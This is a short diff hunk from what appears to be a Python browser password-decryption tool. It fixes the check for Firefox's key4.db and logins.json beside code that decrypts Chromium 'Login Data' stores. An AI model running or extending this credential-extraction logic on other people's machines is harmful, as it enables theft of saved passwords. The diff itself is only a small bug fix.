@@ -230,7 +230,7 @@ if __name__ == '__main__':
                 if(os.path.exists(f"{browser_path}/Login Data") and os.path.exists(f"{browser_path}/Local State")):
                     chromium_based_decryption(browser_path,colors[index])
                     
-            if(os.path.exists(f"{firefox_dir}/key4.db") and os.path.exists(f"{firefox_dir}/Local State")):
+            if(os.path.exists(f"{firefox_dir}/key4.db") and os.path.exists(f"{firefox_dir}/logins.json")):
                 firefox_decryption()
             
         except Exception as e:
